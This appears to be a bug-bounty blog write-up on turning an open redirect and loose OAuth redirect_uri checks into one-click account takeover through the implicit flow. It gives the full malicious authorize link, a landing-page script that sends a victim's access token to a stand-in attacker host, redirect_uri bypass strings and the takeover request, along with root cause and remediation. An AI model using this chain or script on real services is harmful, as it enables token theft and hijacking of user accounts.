---
title: 'Open redirect → full account takeover via OAuth token leak'
description: 'A "won''t fix" open redirect on a marketing subdomain became one-click account takeover — because the OAuth server trusted the whole apex domain and the implicit flow put the token in the URL.'
pubDate: 2026-07-28
heroImage: '/thumbnails/oauth.png'
tags: ['OAuth', 'ATO', 'Critical']
---

Everyone ignores open redirects. Programs close them as informational, researchers
stop reporting them, and triage teams roll their eyes. That is *exactly* why they
still pay — an open redirect isn't a bug, it's a **gadget**. On its own it's worth
nothing. Pointed at an OAuth authorize endpoint, it's an account takeover.

This is the full chain: how a redirect on a forgotten marketing subdomain gave up a
live access token for any user who clicked one link — and how that token became a
password reset, and the password reset became the account.

## The target

`acme.example` ran their own OAuth 2.0 / OIDC server at `sso.acme.example` and used it
for single sign-on across a dozen first-party apps. Reasonable setup. The interesting
part was how the primary app kicked off login:

```http
GET /oauth/authorize
  ?client_id=web
  &response_type=token
  &redirect_uri=https://app.acme.example/callback
  &scope=profile+email
  &state=Rk9P... HTTP/1.1
Host: sso.acme.example
```

Two things jump out.

First, `response_type=token`. That's the **implicit flow** — the access token comes
straight back to the browser in the URL *fragment*, no code exchange. The implicit
flow was deprecated for exactly the reason this post exists, but plenty of first-party
apps never migrated.

Second, `redirect_uri` decides where that token lands. So the only thing standing
between me and a user's token is: *how strictly is `redirect_uri` validated?*

## Probing the redirect_uri allow-list

I threw the usual bypasses at it — `redirect_uri=https://attacker.example`,
`//attacker.example`, `https://app.acme.example.attacker.example`, path tricks,
`@` confusion. All rejected with `invalid_redirect_uri`. Good sign that someone
thought about it; better sign that they thought about it *incompletely*.

The pattern that **passed** told the whole story:

```
redirect_uri=https://go.acme.example/anything   →  accepted
redirect_uri=https://app.acme.example/callback   →  accepted
redirect_uri=https://cdn.acme.example/x          →  accepted
```

The check wasn't validating a registered callback URL. It was validating the
**host suffix** — any `*.acme.example` was trusted. That's a common shortcut: "it's
our domain, it's fine." It is not fine. It's only as safe as your *weakest subdomain*,
and a big company has a lot of subdomains.

So the question became: does any host under `acme.example` have an open redirect I can
borrow?

## Finding the borrowed redirect

`go.acme.example` was a link-shortener / campaign-tracking service the marketing team
used. Its whole job was to bounce users onward:

```
https://go.acme.example/r?u=https://blog.acme.example/spring-sale
```

Feed it an external URL and it redirected there without validation:

```http
GET /r?u=https://attacker.example/grab HTTP/1.1
Host: go.acme.example

HTTP/1.1 302 Found
Location: https://attacker.example/grab
```

A textbook open redirect. On its own: informational, "no security impact,"
close-as-won't-fix. But `go.acme.example` is on the OAuth allow-list. I now had a
**trusted host that forwards wherever I want**.

## The mechanism: fragments survive redirects

Here's the piece that makes this work, and the piece most people don't know.

When a browser follows a `302` to a new URL that has **no fragment of its own**, it
**re-applies the original fragment** to the redirect target. The fragment is a
client-side construct; it rides along.

So if the OAuth server sends the token as `...#access_token=…` to `go.acme.example`,
and `go.acme.example` 302s to `https://attacker.example/grab` (no fragment), the
browser lands on `https://attacker.example/grab#access_token=…`.

The token walks right out of the domain.

```text
victim ──click──▶ sso.acme.example/oauth/authorize?redirect_uri=go.acme.example/r?u=attacker
                        │  (victim already logged in → token issued)
                        ▼
              302 Location: https://go.acme.example/r?u=https://attacker.example/grab
                              #access_token=eyJ...        ◀── fragment attached here
                        │
                        ▼  go.acme.example open-redirects
              302 Location: https://attacker.example/grab
                        │   (target has no fragment → browser re-appends #access_token)
                        ▼
              https://attacker.example/grab#access_token=eyJ...   ◀── token now on my origin
```

## The exploit

The full malicious link, sent to a victim, points only at legitimate `acme.example`
infrastructure — which is what makes it convincing:

```
https://sso.acme.example/oauth/authorize?client_id=web&response_type=token&scope=profile+email&redirect_uri=https%3A%2F%2Fgo.acme.example%2Fr%3Fu%3Dhttps%3A%2F%2Fattacker.example%2Fgrab
```

Any user with a live SSO session needs no interaction beyond the click — the server
sees an existing session, mints a token, and starts the redirect chain. My landing
page just reads the fragment:

```html
<!-- https://attacker.example/grab -->
<script>
  const token = new URLSearchParams(location.hash.slice(1)).get('access_token');
  navigator.sendBeacon('https://attacker.example/collect', token);
  // bounce them back so they never notice
  location.replace('https://app.acme.example/');
</script>
```

With the token, I could call the API as the victim:

```http
GET /api/v2/me HTTP/1.1
Host: api.acme.example
Authorization: Bearer eyJ...

200 OK
{ "id": 88213, "email": "victim@…", "email_verified": true, "role": "user" }
```

## From token to full takeover

A leaked token scoped to `profile email` is already **High**. But the account's own
settings turned it into a takeover. The email-change endpoint accepted the same bearer
token and — critically — didn't require re-authentication or the current password:

```http
POST /api/v2/me/email HTTP/1.1
Host: api.acme.example
Authorization: Bearer eyJ...
Content-Type: application/json

{ "email": "attacker+victim@attacker.example" }
```

Change the email, trigger a password reset to the new address, set a new password.
The legitimate user is locked out of their own account. That's not token theft
anymore — that's **account takeover**, one click, no victim interaction.

## Proving it without crossing a line

Impact has to be demonstrated, not asserted — but on *your own* accounts. I ran the
entire chain between two researcher-controlled test accounts: account A sent the link,
account B (also mine) clicked, A collected B's token and took over B. Zero real users,
zero real data. The report showed the full request/response trail with both accounts
clearly labelled as mine.

That distinction matters. "I could take over any account" backed by a self-contained
two-account PoC is a clean **Critical**. The same claim backed by someone else's token
is an incident report about *you*.

## Root cause

Three failures stacked:

1. **Host-suffix `redirect_uri` validation.** Trusting `*.acme.example` delegates your
   OAuth security to every subdomain you own, including ones marketing spun up.
2. **The implicit flow.** `response_type=token` hands secrets to the browser in a URL,
   where redirects and referrers can leak them. It's deprecated for this reason.
3. **Sensitive actions on a bare bearer token.** Changing the account email should
   require re-authentication, not just a valid access token.

Any one of these fixed alone breaks the chain. All three existed at once.

## Remediation

- **Match `redirect_uri` exactly** against a small allow-list of *registered* callback
  URLs — full string comparison, not host suffix, not `startsWith`.
- **Drop the implicit flow.** Use the authorization-code flow with **PKCE**; the token
  never touches the URL or the browser history.
- **Kill open redirects on every in-scope host** — or at minimum, never put a host that
  performs redirects on an OAuth allow-list.
- **Step up sensitive actions.** Email/password changes require the current password or
  a fresh re-auth, regardless of token validity.

Reported, triaged inside a day, fixed by moving `web` to auth-code + PKCE with exact
redirect matching. Paid as Critical.

## Takeaways

- Treat open redirects as **chain fuel**, not findings. Log every one; they're the
  cheapest gadget in the box.
- Any `response_type=token` is a flashing light. The implicit flow leaks by design.
- When a `redirect_uri` allow-list trusts a whole domain, **enumerate every subdomain
  on it** and look for a single redirect. One is all you need.
- The bug that pays isn't the redirect or the loose allow-list or the weak email
  change — it's the **line you draw between them**.
